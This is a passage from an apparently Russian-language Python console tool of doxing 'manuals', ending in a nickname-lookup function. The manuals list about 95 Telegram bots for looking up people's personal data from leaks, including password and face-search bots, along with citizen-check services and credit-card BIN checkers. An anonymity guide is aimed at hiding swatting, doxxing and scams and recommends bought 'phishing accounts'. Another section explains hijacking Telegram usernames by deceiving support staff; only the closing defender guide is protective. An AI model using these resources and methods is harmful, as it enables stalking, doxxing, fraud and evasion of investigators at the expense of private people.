кста те которые я сверху показать я их в основном использую,иногда сам чекаю по базе или по сервисам


90+ Ботов для пробивов 


1.@phonenumberinformation_bot
2. @Quick_osintik_bot
3. @UniversalSearchRobot
4. @search_himera_bot
5. @Solaris_Search_Bot
6. @Zernerda_bot
7. @t_sys_bot
8. @OSINTInfoRobot
9. @LBSE_bot
10. @SovaAppBot
11. @poiskorcombot
12. @SEARCHUA_bot
13. @helper_inform_bot
14. @infobazaa_bot
15. @declassified_bot
16. @GHack_search_bot
17. @osint_databot
18. @Informator_BelBot
19. @HowToFindRU_Robot
20. @SEARCH2UA_bot
21. @UsersSearchBot
22. @BITCOlN_BOT
23. @ce_poshuk_bot
24. @BlackatSearchBot
25. @dataisbot
26. @n3fm4xw2rwbot
27. @cybersecdata_bot
28. @safe_search_bot
29. @getcontact_real_bot
30. @PhoneLeaks_bot
31. @useridinfobot 
32. @mailcat_s_bot
33. @last4mailbot
34. @holehe_s_bot
35. @bmi_np_bot
36. @clerkinfobot
37. @kolibri_osint_bot
38. @getcontact_premium_bot
39. @phone_avito_bot
40. @pyth1a_0racle_bot
41. @olx_phone_bot
42. @ap_pars_bot
43. @SPOwnerBot
44. @regdatebot
45. @ibhldr_bot
46. @TgAnalyst_bot
47. @cryptoscanning_bot
48. @LinkCreatorBot
49. @telesint_bot
50. @Checknumb_bot
51. @TelpoiskBot_bot
52. @TgDeanonymizer_bot
53. @protestchat_bot
54. @locatortlrm_bot
55. @GetCont_bot
56. @usinfobot
57. @SangMataInfo_bot
58. @creationdatebot
59. @tgscanrobot
60. @InfoVkUser_bot
61. @getfb_bot
62. @GetOK2bot
63. @VKHistoryRobot
64. @detectiva_robot
65. @FindNameVk_bot
66. @vk2017robot
67. @AgentFNS_bot
68. @OpenDataUABot
69. @egrul_bot
70. @Bumz639bot
71. @ogrn_bot
72. @ShtrafKZBot
73. @egrnrobot
74. @VipiskaEGRNbot
75. @Search_firm_bot
76. @geomacbot
77. @pwIPbot
78. @ipscorebot
79. @ip_score_checker_bot
80. @FakeSMI_bot
81. @ipinfo_check_bot
82. @Search_IPbot
83. @WhoisDomBot
84. @vimebasebot
85. @maigret_osint_bot
86. @PasswordSearchBot
87. @ddg_stresser_bot
88. @BotAvinfo_bot
89. @reverseSearch2Bot
90. @pimeyesbot
91. @findfacerobot
92. @CarPlatesUkraineBot
93. @nomerogrambot
94. @ShtrafyPDRbot
95. @cerbersearch_bot


пжж чекните каждый


вот вам сервисы

ИСТОЧНИКИ ДЛЯ ПРОВЕРКИ ГРАЖДАН РОССИИ

Международный розыск:
└ https://www.interpol.int/notice/search/wanted

Список теppористов:
└ http://fedsfm.ru/documents/terrorists-catalog-portal-act

Федеральный розыск:
└ https://mvd.ru/wanted

Розыск сбежавших заключенных:
└ http://fsin.su/criminal/

Розыск ФССП:
└ http://fssprus.ru/iss/ip_search

Действительность паспорта:
└ http://сервисы.гувм.мвд.рф/info-service.htm?sid=2000

Проверка ИНН:
└ https://service.nalog.ru/inn.do

Кредиты:
└ https://app.exbico.ru/

Исполнительные производства:
└ http://fssprus.ru/iss/ip

Налоговые задолженности:
└ https://peney.net/

Залоги имущества:
└ https://www.reestr-zalogov.ru/state/index#

Банкротство:
└ https://bankrot.fedresurs.ru/

Участие в судопроизводстве:
└ https://bsr.sudrf.ru/bigs/portal.html

Решения мировых судей СПб:
└ https://mirsud.spb.ru/

Участие в бизнесе:
└ https://zachestnyibiznes.ru/
└ https://ogrn.site/

Поиск в соцсетях:
└ https://yandex.ru/people
└ https://pipl.com

ща еще будет


Сервисы для проверки BIN кредитных карт:

binbase.com (2 запроса в день если нет аккаунта)
binlist.net (общая информация по карте)
binlist.io (тож самое что и сверху ток оформление другое)
freebinchecker.com (хуйня)
bincheck.org (общая информация по карте)
binchecker.com (я заебался вводить капчу)
bincheck.io (хороший сайт, общие сведения о карте)

ща еще

СЕРВИСЫ ДЛЯ ПОИСКА🔎 :

NickName
<------------------------------------------------>
https://namechk.com
https://knowem.com
https://www.namecheckr.com
http://usersherlock.com
https://usersearch.org
https://thatsthem.com
https://inteltechniques.com/menu.html
<------------------------------------------------>
People
<------------------------------------------------>
http://people.yandex.ru
https://vk.com/people
https://www.facebook.com/friends/requests/
https://twitter.com/search-advanced
http://pipl.com
https://www.spokeo.com/
https://scholar.google.ru/
https://yandex.ru/people
<------------------------------------------------>
Photo
<------------------------------------------------>
@face_detect_bot
https://findmevk.com/
https://images.google.com/
https://yandex.ru/images/
https://www.tineye.com/
https://vlicco.ru/
http://searchface.ru/
https://findface.pro/ru/
<------------------------------------------------>
Exif
<------------------------------------------------>
http://metapicz.com/#landing
http://linkstore.ru/exif/
http://exif.regex.info/exif.cgi
http://imgops.com/
<------------------------------------------------>
Number
<------------------------------------------------>
@get_kontakt_bot
http://nomerorg.me
http://spra.vkaru.net
https://phonenumber.to
http://doska-org.ru/
Приложение "GetContact"
Приложение "NumBuster"
Приложение "Truecaller"
Приложение "Skype"
<------------------------------------------------>
Auto
<------------------------------------------------>
https://avinfo.co/
https://гибдд.рф/check/auto

ща еще будетт

3 Сервиса по пробиву данных

https://numbuster.com/ru/ - первый сайт для поиска информации о владельце телефона, работает как и со странами СНГ, так и с США и другими. 

https://pipl.com/ - Второй сайт для поиска человека по номеру телефона, никнейму, почте или имени.

https://scholar.google.ru/ - С помощью данного сайта можно найти все связи человека с наукой.

Ищем данные человека по электронной почте!

OSINT —  поиск информации о человеке или организации по базам данных, которые доступны всем;

▪️haveibeenpwned —  Сервис, который проводит проверку почты в слитых базах. 
▫️ emailrep — Сайт найдет на каких сервисах был зарегистрирован аккаунт, использующий определенную почту.
▪️ intelx —  Многофункциональный поисковик, поиск осуществляется еще и по даркнету.
▪️ mostwantedhf — Данный сервис ищет аккаунт Skype.

авхенно ща еще будет



📎 Поиск человека по аккаунту ВКонтакте:
searchlikes.ru • tutnaidut.com • 220vk.com • vk5.city4me.com • vk.watch • vk-photo.xyz • vk-express.ru • archive.org • yasiv.com • archive.is • yzad.ru • vkdia.com

📎 Поиск человека по Twitter аккаунту:
followerwonk.com • sleepingtime.org • foller.me • socialbearing.com • keyhole.co • analytics.mentionmapp.com • burrrd.com • keitharm.me • archive.org • undelete.news

📎 Поиск человека по Facebook аккаунту:
graph.tips • whopostedwhat.com • lookup-id.com • keyhole.co • archive.org

📎 Поиск человека по Instagram аккаунту:
gramfly.com • storiesig.com • codeofaninja.com • sometag.org • keyhole.co • archive.org • undelete.news

📎 Поиск человека по Reddit аккаунту:
snoopsnoo.com • redditinsight.com • redditinvestigator.com • archive.org • redditcommentsearch.com

📎 Поиск человека по Skype
mostwantedhf.info • cyber-hub.pw • webresolver.nl



многие не знают,как отличить виртуальный номер от настоящего.

Для этого нам поможет сервис:

https://m.smsc.ru/testhlr/

осуществляет проверку номера HLR-запросом и выдает информацию о номере ахуенно крч

https://data.intelx.io/saverudata/#/?n= 

""",
    '4': """
Анонимность

раздел 1
безопасность и настройка анонимности:

удалите все Российские приложения. Все
говорят про сливы Гугла и Майкрософта, но
это - пендосы, а до русского человека ближе
дойдет рука русских силовиков. ВКонтакте-
собирает полную информацию о вас,
отслеживает ваши действия, и передвижения,
все переписки - хранятся, и при удалении
сообщения открою секрет, ты не удаляешь их
с ВКонтакте, просто появляется своего рода
функция "скрытия", а так удаленные
сообщения, и медиа контент доступны всем
пользователям при наличии ссылки . Не
желательно использовать Киви даже для
повседневных покупок, ищите аналоги
используйте ВПН. Только отбросы
используют полностью бесплатные ВПН. ВПН -
вычислительная мощность, которая
обрабатывается на другом конце света.
Никому нет дела до того, чтобы с вами
"бесплатно" делиться этим ресурсом, по этому
бесплатные ВПН зарабатывают на сливе
данных. Так-же некоторые бесплатные ВПН
бывают опасней, чем отсутствие их в целом,
так как через него обрабатывается каждый
вас запрос, и к конченным впн сервисам
обратиться легче, а так-же информации на вас
будет если не больше, то одинаково что и без
ВПН.
Нормальные впн - Протон, NordVPN , у Протона
есть бесплатная версия. Там доступно всего 3
страны, однако это уже будет повышать
эффективность, так-же советую Mullvad он не собирает логи, и стоит 300₽/месяц
использовать Тор. Топ сам по себе не
анонимен, соответственно он бы не
развивался при полной анонимности, однако,
грамотная настройка приватности, и
включение ВПН вместе с тором - делает его
отличным браузером для поиска информации
удалите все свои аккаунты из социальных
сетей. Посмотрите в интернете, как это
делается. Это вызовет явное подозрение, по
этому удалять необходимо не сразу, а
постепенно . Удаляйте любые упоминание,
попытайтесь стать на место обычного
пользователя, который не имеет никаких
связей с спец.службами - и постарайтесь
найти себя, ищите по номеру, ищите по ФИО,
ищите по вашему нику\юзеру. Если что-то
нашли - сразу удаляйте
планка: "Телеграм". Задайте минимальную
планку для общения : приложения, с
приватностью не менее, чем телеграм. Из
этого следует, что вам необходимо удалить
такие средства общение, как Вайбер, Ватсапп,
и прочий шлак со своего устройства. С 2021 го
года, Ватсапп окончательно опозорился, и
теперь все ваши данные равносильно как и с
ВК- читаются, и полностью собираются.
Вообще никогда не трогайте сообщества
Марка(создатель фейсбука) - все они созданы
ради прибыли, и наживы над людьми
(Инстаграм, Фэйсбук, Мэссенджер) . Сама
компания часто подвергалась судебным
искам, по обвинению в сливе личных данных,
а сами хацкеры регулярно ищут там лазейки, и
используют их для вашего слива . НА ВАС
зарабатывают за просто так, благодаря вам -
кто-то сверху получает денюшку за просмотр
рекламы, или-же вас по умолчанию
используют для улучшения систем
рекомендаций, как-то так
тик ток. Поставил бы его в 5 пункт, но он
отдельно заслуживает внимание. Помойка по
всем фронтам, которая кроме деградации
опять-же зарабатывает на использовании
твоих данных, которые могут передаваться в
высшие органы. Данные далеко не
ограничиваются "лайком" под клип, вовсе нет,
всё то что может собирать телефон с вас -
отчасти собирают и эти приложения, и
используя Тик Ток вы даете открытые двери в
ваш телефон. Так-же Тик Ток был добавлен в
Виндовс 11, а она в свою очередь является
провальной, и сливает даже снимок вашей
фотографии с того же ноутбука, даже когда вы
сами не включали камеру, якобы для
улучшение чего-то там
снесите Виндовс. Виндовс - самая удобная
система, но она максимально смехотворна .
Официально, она стоит 300 долларов, и при
этом включает в себя огромнейший спектор
того, что можно на вас накопать. Понимайте,
что операционная система - это целая машина,
это не какой-то сайтик, или программка
(которые собирают минимальную
информацию о вас), нет, это по сути все ваши
действия, будь они в интернете, или за
какой-то игрой. Код Виндовс - полностью
закрыт, мало людей лишь знает, какие
масштабы хранит операционка. Тем не менее,
удалось выяснить такие вещи: виндовс
собирает на свои сервера абсолютно любую
клавишу, которую вы напечатали. Виндовс по
умолчанию интересуется, что вы гуглите для
заработка на более эффективной
продвижении рекламы, так-же Виндовс
собирает данные с вашей вебки, записывает
ваш микрофон, запоминает все посещения на
карте, и многое ещё. Банальная альтернатива -
Линукс . Линукс - свободное ПО, каждая
строка кода может рассматриваться вами, и
проверяться. Линукс не сложен в освоении, и
дистрибутивы полностью можно
настроить под себя, а так-же вам в свободных
"версиях" Линукса дают свободные ПО,
которые практически не собирают данных.
Тем не менее, дистрибутивы вроде Дебиана
или Убунту - не анонимны, их единственная
"анонимность" - проводя аналогию, это своего
рода "отсутствие камеры" в вашей квартире, а
так где находится ваша квартира, и прочее -
знать может каждый . По этому, есть
анонимные дистрибутивы(версии) Линукса:
Хвосты, Qubes Os, Gentoo, и это лишь то что я
могу вспомнить.

каких ошибок не стоит совершать:

личные данные. Никак не давайте намека
на прежнего себя, старайтесь быть новым,
оригинальным. Вообще в таких случаях лучше
не писать в чате вообще, или как с последним
пунктом в предыдущем разделе - просто быть
чуть тихим, и спокойным
использование постоянной почты. Есть
временные почты, которые безопасны, и
никак не будут составлять ваш цифровой
например, например - @TempMail_org_bot ,
или веб-версия - https://temp-mail.org
использование Гет-Контакта. Полностью
сливное приложение, собственно их базы
данных номеров формируются за счёт
того, что вы устанавливаете его к себе на
телефон, а после разрешение доступа - оно
считывает все ваши контакты, и
добавляет к себе базу. Другими словами,
вы сами пополняете базу данных, и к
примеру из-за вас, при установке Гет
Контакта - ваш друг будет подписывать
под своим ФИО, или по каким-то
характеристикам, так как у вас в записной
книге было именно вот такое. Так-же
здесь можно обойтись другими приколами
- не записывать просто контакт под своим
именем, а запоминать номера, или делать
какое-то сокращение, которое точно бы не
спалило вашего друга, который вам
доверяет. Если хотите посмотреть номер в гк, юзайте ботов или знакомых. 
файлы . Не скачивайте файлы с
неизвестных источников, сидя на винде,
или на андроиде - вы легко можете
подхватить рандомный вирус удаленного
доступа
не скидывайте фотки файлом . Фотографии
хранят приколы, называемые "метаданными",
они могут содержать модель вашего
телефона, расширение камеры, дата
фотографии, местоположение фотографии,
время создания фотографии, диагональ, угол
наклона камеры, и прочие маленькие
параметры. По дефолту, в Телеграме
отображаются метаданные лишь в случае
отправки файлов, а не фотографий (да,
разница если что есть), по этому не делайте
этого, даже если это фотка вашего дома, или
созданная где-то в темноте - по
перечисленным параметрам ваш поиск будет
простым и не затруднительным, если вы один
раз случайно отправите фотку с вашей гео,
или любой другой информацией . Советую использовать вам имгур или другие хостинги для фотографий. 

анонимность в Telegram

1. Для сделок используйте секретные чаты они имеют сквозное шифрование. 
2. Используйте виртуальные номера/фишинг аккаунты(их можно купить на лолзтим) 
3. Обязательно используйте все советы описаные выше для поддержания анонимности.
4. Отключите p2p звонки, благодаря ним можно отследить ваш айпи. 
5. Советую браузер/впн Aloha, имеет бесплатную/платную версию, со своей работой справляеться на все 100.


что использовать:

1. Твой VPN - Mullvad Весь входящий и исходящий трафик с компьютера проходит
по зашифрованному туннелю на VPN-сервер, и уже оттуда отправляется на сайт, который вы посещаете.
Таким образом, веб-сайт видит лишь VPN-сервер, а не вас. И никакая информация,
которую записывает интернет-провайдер, не может быть связана напрямую с вами.
Этот VPN никогда не сливался Федеральной Службе Безопасности , и каким либо другим службам по кибербезопасности.

2. Виртуальная машина - Используйте Kali Linux у которого идет трафик с Whonix с полностью завернутой сетью Tor.
Как же сделать это - https://www.youtube.com/watch?v=XbBLpDZeLPE 

3. Твой браузер и настройка его. Если вы хотите какой либо анти-детект браузер со встроенным прокси
я бы посоветовал - Incogniton , Tor но важно заметить что они пропускают только сеть через прокси
а не шифруют ее. Лично я пользуюсь браузером LibreWolf он на основе firefox только более лучше настроен.
Вам понадобятся расширения на ваш браузер. 1. Ublock Origin блокирует куки. 2. Cookie Manager можно следит и очищать куки в клик.
3. CanvasBlocker блокирует fingerprint. 4. Canvas FingerPrint Defender подменивает fingerprint. 5 Switch User-Agent помогает подделывать
юзер агента.

4. Шифрование данных - я посоветую вам приложение VeraCrypt .Как настраивать и скачивать его скину ниже.
https://telegra.ph/VeraCrypt-10-12 (Статья не моя.)

5. O&O ShutUp 10 - Отключает телеметрию на вашем Windows . 

6. KeePassXC - Приложение позволяющее хранить надежно пароли и логины от ваших аккаунтов.

7. Впринципе теперь можно приступать к созданию личности и вашего линка. Покупаете виртуальный номер под цепочкой
анонимности , а затем регистрируете ваш аккаунт. Главное чтобы вы ни где не упомянали ваши прошлые личности
и не делайте одинаковые ники в соц. сетях , почты где только можно , потому что каждый даже не опытный доксер щас
умеет делать поиск по никнейму. В реальной жизни никому не рассказывайте о своей деятельности будь то сваттинг ,
доксинг , скам . От вас требуется всегда заходить в телеграмм да и вообще скитатся по интернету с всем тем что я перечислил.

8. Лучше не пользуйтесь какими либо ботами которые просят подтвердить то есть дать боту ваш номер ,
иначе может потом по поиску в этих ботах когда вы уже попадете в базу данных этих ботов , выдавать ваши
прошлые юзерки , номера , почты , логи . 

9. По удаляйте старые аккаунты свои , родителей . Чтобы было меньше зацепок для раскрытие вашей личности. 
По скрывайте вашу информацию в разных поисковиках , ботах. Имейте виртуальные номера везде где только возможно.
И если уж пошла речь об этом , то я бы не советовал заказывать доставки на дом из популярных сервисов , тк 
можно попасть в базу данных.

Но даже при соблюдение всех правил , не бывает полной анонимности в интернете.
Я не буду пожалуй сюда вставлять методички федералов , как они работают и ищут информацию , 
так как это и так слито и это можно посмотреть если хорошенько поискать на просторах интернета.


дополнительные цепочки анонимности которые можно также использовать:


ОСНОВНОЙ OC > Kali Linux > Mullvad vpn > VMware > Tails/whonix > tor / FireFox Mozilla / LibreWolf

более анонимная цепочка

ОСНОВНОЙ OC > Kali Linux > Mullvad vpn > Dns Crypt > Proxychairs > ssh тунель > VMware > Tails/Whonix > Tor security > Tor 

цепочки анонимности 

клиент > VPN/TOR/SSH-тунель > цель.

Клиент > VPN Mullvad > Тор > цель

Клиент > VPN > Удаленное рабочее место (через RDP/VNC) > VPN Mullvad > цель

Клиент > Double VPN (в разных дата центрах, но рядом друг с другом) >
Удаленное рабочее место + Виртуальная машина > VPN > цель


объяснение:


Предлагаемая схема - это первичное подключение к VPN и вторичное подключение к
VPN (на случай, если 1-й VPN будет скомпрометирован, через какую либо утечку),
для скрытия трафика от провайдера и с целью не выдать свой реальный IP-адрес в
дата центре с удаленным рабочим местом. Далее установленная виртуальная
машина на этом сервере. Зачем нужна виртуальная машина я думаю понятно?
- Чтобы каждую загрузку делать откат к самой стандартной и банальной системе, со
стандартным набором плагинов. Именно на машине с удаленным рабочим местом, а
не локально. Люди, которые использовали виртуальную машину локально, а из под
нее TripleVPN на эллиптических кривых, однажды зайдя на whoer.net, очень
удивились увидеть в графе WebRTC свой реальный и настоящий IP-адрес. Какую
ловушку реализуют завтра, обновя тебе браузер, не знает никто, главное не держи
ничего локально. Допустим ты физически находишься в Москве, так и строй схему так, чтобы первый
VPN тоже был в Москве, второй, например, в Милане, а удаленное рабочее место,
например, в Италии и конечный VPN, например, в Беларуси. Логика построения
должна быть такой, что не стоит использовать все сервера внутри, например,
еврозоны. Все дело в том, что там хорошо налажено сотрудничество и
взаимодействие различных структур, но при этом не стоит их разносить далеко друг от
друга. Соседние государства, ненавидящие друг-друга — вот залог успеха твоей
цепочки Что бы быть ультра-неуязвимым - можно еще добавить автоматическое посещение
веб-сайтов в фоновом режиме, с твоей реальной машины как имитацию серфинга,
чтобы не было подозрения, что ты используешь какое-то средство анонимизации. Так
как трафик идет лишь к одному IP-адресу и через один порт. Можно добавить
использование ОС Whonix/Tails, получать доступ в интернет через публичный Wi-Fi в
кафе (практически все пароли есть в приложении Wi-Fi Map), при этом обязательно
поменяв данные сетевого адаптера, которые тоже могут привести к деанонимизации.
Если дело очень серьезное, то есть необходимость сменить внешность (вспоминаем
про очки, бабушкин шарф и даже накладные усы и парики), чтобы не быть
идентифицированы по лицу в том же самом кафе. Уже внедрены технологии,
позволяющие делать. К сожалению, это будущее и оно уже здесь. Ты можешь быть
определен, как по наличию координат местонахождения, в файле фотографии,
сделанной твоим телефоном до диагностики определенного стиля письма. Просто
помни об этом. Fingerprints, как и попытки определения использования VPN, по средствам замера
времени отправления пакета от пользователя к вебсайту и от вебсайта к IP-адресу
пользователя (не берем в расчет такой «костыль» как блокировка только входящих
запросов определенного вида) обойти не так просто. Обмануть кое-что можно, одну-
другую проверку, но нет гарантий, что завтра не появится очередное «зло». Именно
поэтому тебе необходимо удаленное рабочее место, именно поэтому нужна чистая
виртуалка, именно поэтому это лучший совет, который можно дать, на данный
момент. Cтоимость такого решения может начинаться всего лишь от 40$ в месяц. Но
учти, что для оплаты, следует использовать исключительно крипту
Понять о том, что такое IP-адрес и как он работает
первостепенно важно, так как использование сети интернет является
краеугольным камнем во многих мошеннических схемах.
IP-адрес (Internet Protokol address) – это уникальный
идентификационный номер, который присваивается каждому
компьютеру при выходе в сеть интернет. Он представляет собой
последовательность из 4 цифр в диапазоне от 0 до 255, чередующихся
через точку. Например, 178.218.36.0.
IP-адрес выдается компьютеру его интернет провайдером в
момент начала интернет сессии – открытия первой интернет-
страницы, и заканчивается закрытием интернет-сессии – закрытием
последней интернет-страницы. Процесс соединения компьютера с
сайтом в упрощенном виде выглядит следующим образом:
Компьютер, нажатием клавиши мышки, по протоколу IP
делает запрос сайту
Сайт, по протоколу IP, предоставляет ответ в виде
отобразившейся страницы
Таким образом, на каждом сайте («Вконтакте», «Авито»,
«Юла» и др.) хранится история соединений с его пользователями, а
следовательно и их IP-адреса. При каждом выходе в интернет
мошенник оставляет свой «след», по которому его можно вычислить.
Также как и абонентский номер, IP-адрес имеет свой ресурс
нумерации, то есть каждому интернет провайдеру выделено
определенное количество IP-адресов в конкретном диапазоне.
При помощи интернет ресурса www.2ip.ru (прямая ссылка:
www.2ip.ru/whois/), зная IP-адрес, можно легко определить
провайдера. Рассмотрим на примере IP-адреса: 178.218.36.0:
Установлено, что IP-адрес 178.218.36.0 принадлежит провайдеру «Атэкс
плюс» в г. Рыбинске (в адрес указанного провайдера и нужно направлять
запрос).
ВЫВОД: установив IP-адрес и точное время его
использования в сети интернет, сотрудник может узнать адрес
нахождения персонального компьютера, с которого работал
злоумышленник (адрес квартиры, частного дома или кафе).
Получение сведений по IP-адресам усложняет использование
мошенниками легкодоступных средств анонимизации в сети, которые
называются VPN (виртуальная частная сеть). Смысл виртуальной
частной сети заключается в том, что пользователь интернета, перед
тем как выйти на сайт, подключается к серверу третьего лица, как
правило локализующегося на территории иного государства.
Схематично работа виртуальной частной сети выглядит следующим
образом
По сути, запрос на интернет-сайт проходит аналогичным
образом, какой был описан ранее, однако в истории соединений сайта
остается не реальный IP-адрес пользователя, а IP-адрес
использованного им VPN-сервера, который, как показывает практика,
в большинстве случаев принадлежит иностранным интернет
провайдерам, которым направить запрос в рамках Российского
правового поля не представляется возможным.
том, каким образом можно обойти данную попытку мошенника
скрыть себя в сети, мы поговорим после в подразделе «Понятие
Cookie-файлов». Понятие Cookie-файлов как средства деанонимизации
мошенника в сети интернет
мы говорили о понятии IP-адреса и наиболее
популярном сервисе анонимизации в сети интернет – VPN. В данном
разделе будет разъяснено понятие Cookie-файлов, как способ обойти
защиту мошенника.
Я думаю многие замечали, что стоит вбить в поисковую строку
«Яндекс» или «Google» запрос об определенном типе товара, как
браузер начинает выдавать рекламу именно о нем. К примеру, написав
«Купить коляску недорого», появляется куча всплывающих окон с
рекламой колясок, детского питания, игрушек и прочих вещей по
данной тематике. Все дело в том, что множество интернет сайтов
(но не все) хранят информацию о своих пользователях. Сбор и
анализ этой информации происходит посредством Cookie-файлов.
Cookie-файл – это фрагмент данных, который интернет сайт
передает в интернет-браузер (Google Chrome, Mozilla Firefox и др.)
своего нового пользователя, чтобы «запомнить» его. При следующем
посещении данного сайта, он уже будет «знать» о подключившемся
пользователе ряд информации, которая будет расти с каждым
последующем посещением:
сайт запоминает ваши логины и пароли – именно благодаря
Cookie-файлам вам не нужно каждый раз заново вводить пароли в
социальных сетях и других сайтах;
- сайт запоминает предпочитаемый вами язык;
сайт запоминает последние просматриваемые вами страницы;
сайт запоминает историю ваших посещений (данная функция
Cookie и имеет для нас ключевое значение).
Схематично Cookie работает следующим образом:
При первом посещении сайта он передает вашему
браузеру Cookie-файл. При всех последующих входах на
данный сайт браузер обозначает полученный от него
Cookie-файл для идентификации
Важной особенностью Cookie-файлов является их
неизменность – мошенник сколько угодно раз может менять свой IP-
адрес через VPN, проходить регистрацию с разных абонентских
номеров, но сайт все равно поймет, что все это время к нему
подключается один и тот же пользователь, то есть используется
браузер одного и того же персонального компьютера.
Каким же образом это может помочь при расследовании предоставлении информации
о лице, разместившем данное мошенническое объявление
""",
     '5': """
Хочу поделится схемой угона username в Телеграме. Многие о нем слышали, я и сам давно знал про это, но не придавал вниманию, пока сам не столкнулся с данной ситуацией.

Есть способ как сам Телеграм может передать вам почти любой username. Для этого нужно иметь с данным именем аккаунты в других соц сетях, достаточно будет Twitter и Instagram. Регистрируйтесь с нужным с вам username в данных соц сетях, создаете мнимую деятельность от лица какой-то компании, достаточно будет 2-3 недели публиковать посты, показать что аккаунты живые. Далее пишите в тех поддержку Телеграм сообщение, что хотите присвоить себе имя, так как ваша компания уже ведет деятельность в других соц сетях. Через некоторое время без лишних вопросов вам спокойно передают нужное вам имя.

Столкнулся сам с такой проблемой, получив от Телеграм сообщение, что мой username успешно передали другим в связи с политикой компании. За место моего имение *username* добавили *username_mv*. Хорошо, что вовремя заметил и успел везде на форумах оповестить и поменять контакты. Посмотрел аккаунты с моим именем в других соц сетях и удивился, как телеграм вообще может совершать такие действия. Там были рецепты еды, с корявым текстом и левыми фотографиями блюд, не было даже описание и аватарки на аккаунтах.

Поняв, что вернуть ничего не удасться, сменил контакты на форумах и смирился, что будут новые. Решил для предотвращения такой ситуации в дальнейшем зарегистрировать с моим username аккаунты в других соц сетях, и с удивлением обнаружил, что они уже заняты. Написал в тех поддержку Телеграма, объяснив ситуацию, буду ждать от них ответа и готовится снова менять везде контакты.

Поэтому предупреждение для всех, что бы не отдать свое имя мошенникам, которые в дальнейшем смогут от вашего лица обмануть людей на деньги и испортить вашу деловую репутацию, в спешном порядке займите вашим username другие соц сети. Явление может иметь массовый характер и отрабатывать аккаунты многих крупных продавцов, может быть, уже по вашему имени написано письмо в тех поддержку и оно ожидает трансфера третьи руки.

*СПОСОБ НЕ ЯВЛЯЕТСЯ НОВЫМ, ОН РАБОТАЕТ УЖЕ ДАВНО, НО КРАЙНЕ ШИРОКУЮ ОГЛАСКУ НАЧАЛ НАБИРАТЬ ОТНОСИТЕЛЬНО НЕДАВНО*
Agramus - я позаимствовал данный материал, я не его создатель.
""",
    '6':"""

Гайд по общению с токсичными личностями для дефера

Если вы выступаете в роли защитника (дефера) и ваша задача — защитить жертву от сватера, тролля или доксера, ваша роль меняется. Теперь вы не просто реагируете, а активно ведёте переговоры и минимизируете угрозу для клиента.

1. Как взаимодействовать со сватером
Сватеры используют страх и стресс как оружие. Ваша задача — показать, что их действия под контролем, и обезопасить жертву.

Тактика переговоров:
Проявите уверенность.

Скажите сватеру, что его действия уже отслеживаются:
"Я вижу, что ты пытаешься сделать. Мы уже предупредили полицию о возможном сватинге. Любой ложный вызов будет отслежен."
Установите рамки.

Не давайте сватеру манипулировать вами. Ответы должны быть короткими, без эмоций:
"Мы не будем играть в твою игру. Ты понимаешь, что за это грозит реальное наказание?"
Перенесите давление на сватера.

Укажите на последствия:
"Ложный вызов спецслужб — это уголовное преступление. Полиция легко найдёт тебя по звонку или IP."
Не провоцируйте.

Не пытайтесь оскорблять сватера, это может ухудшить ситуацию для жертвы.
Дополнительные действия:
Соберите данные.
Узнайте как можно больше о сватере: IP-адрес, ник, платформу. Эти данные могут помочь в дальнейшем.
Подготовьте жертву.
Помогите жертве заранее связаться с местной полицией и предупредить их о возможных ложных вызовах.
Убедитесь, что жертва использует VPN и защиту данных.
2. Как взаимодействовать с троллем
Тролли хотят внимания и эмоциональной реакции. Ваша задача — лишить их этих ресурсов и показать, что жертва защищена.

Тактика переговоров:
Игнорируйте провокации.

Тролли часто хотят вовлечь вас в бесконечные споры. Удерживайте фокус на защите клиента.
Отвечайте профессионально и сухо.

"Ваши действия зафиксированы. Продолжение может повлечь жалобу в администрацию платформы."
Укажите на бессмысленность их действий.

"Потраченное время на провокации не принесёт тебе ничего, кроме бана."
Изолируйте жертву.

Помогите клиенту настроить приватность в аккаунтах и заблокировать тролля.
Дополнительные действия:
Модерация.
Сообщите модераторам платформы о нарушениях.
Анонимизация.
Убедитесь, что личные данные клиента невозможно найти или использовать против него.
3. Как взаимодействовать с доксером
Доксер — это серьёзный противник, который уже собирает или распространил данные о жертве. Ваша задача — минимизировать ущерб и дать понять, что дальнейшие действия бесполезны или опасны для него.

Тактика переговоров:
Демонстрируйте уверенность.

"Всё, что ты пытаешься сделать, уже задокументировано. Мы работаем с платформой и правоохранительными органами."
Обратитесь к их страху наказания.

"За распространение личной информации тебе грозит реальная ответственность. Твои действия уже отслеживаются."
Не идите на уступки.

Не показывайте, что готовы договариваться за деньги или информацию. Это только усилит его давление.
Снимите интерес к жертве.

"Информация, которую ты пытаешься опубликовать, уже не актуальна. Это не принесёт тебе никакой выгоды."
Дополнительные действия:
Соберите максимум данных о доксере.
Занимайтесь его деанонимизацией (если это не нарушает законы вашей страны). Используйте сервисы, такие как Shodan, для поиска его активности.
Свяжитесь с платформами.
Сообщите о нарушениях в администрацию сайтов, где опубликованы данные жертвы.
Проконсультируйтесь с юристами.
Иногда стоит привлечь юридическую помощь, чтобы усилить давление на доксера.
Общие советы для всех случаев:
Работайте хладнокровно.

Ваше спокойствие — ключ к снижению эскалации конфликта.
Собирайте доказательства.

Всегда фиксируйте переписку, скриншоты, записи. Это поможет как в переговорах, так и в дальнейшем.
Используйте анонимные средства общения.

Общайтесь через зашифрованные каналы, чтобы не стать следующей жертвой.
Защищайте клиента.

Проверьте, где и как его данные могли быть опубликованы, и минимизируйте утечки.
Не переходите на личности.

Даже если оппонент оскорбляет или угрожает, не отвечайте тем же.
Этот гайд поможет вам эффективно защищать жертву и вести переговоры с враждебными личностями.

"""}
    
    while True:
        clear_screen()
        print(colored_text("Выберите мануал:"))
        for key, title in manuals.items():
            print(f"{key}. {title}")
        
        choice = input(colored_text("Введите номер мануала: "))

        if choice in manuals:
            if choice == '7':
                break
            clear_screen()
            print(colored_text(f"Мануал: {manuals[choice]}\n"))
            print(colored_text(manual_texts.get(choice, "Мануал отсутствует.")))
            input(colored_text("\nНажмите Enter, чтобы вернуться в меню."))
        else:
            print(colored_text("Неверный ввод, попробуйте снова."))





def search_social_media():
    nick = input(colored_text(f"Введите никнейм: "))

    print(colored_text(f"Поиск информации..."))
    print(colored_text(f"Соцсети"))

    urls = [
    f"https://www.instagram.com/{nick}",
    f"https://www.tiktok.com/@{nick}",
    f"https://twitter.com/{nick}",
    f"https://www.facebook.com/{nick}",
    f"https://www.youtube.com/@{nick}",
    f"https://t.me/{nick}",
    f"https://www.roblox.com/user.aspx?username={nick}",
    f"https://www.twitch.tv/{nick}",
    f"https://onlyfans.com/{nick}",
    f"https://www.xvideos.com/{nick}",
    f"https://www.pornhub.com/users/{nick}",
    f"https://snapchat.com/add/{nick}",
